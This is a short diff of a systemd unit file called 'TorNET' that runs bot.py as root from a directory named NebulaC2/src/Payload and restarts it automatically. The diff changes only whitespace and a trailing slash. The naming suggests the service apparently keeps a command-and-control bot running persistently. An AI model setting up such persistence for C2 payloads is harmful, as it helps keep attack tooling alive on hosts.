@@ -1,4 +1,5 @@
 [Unit]
+
 Description=TorNET
 After=network.target
 Wants=network-online.target
@@ -6,7 +7,7 @@ Wants=network-online.target
 [Service]
 Type=simple
 User=root
-WorkingDirectory=/root/NebulaC2/src/Payload/
+WorkingDirectory=/root/NebulaC2/src/Payload
 ExecStart=/bin/python3 bot.py
 Restart=always
 RestartSec=10
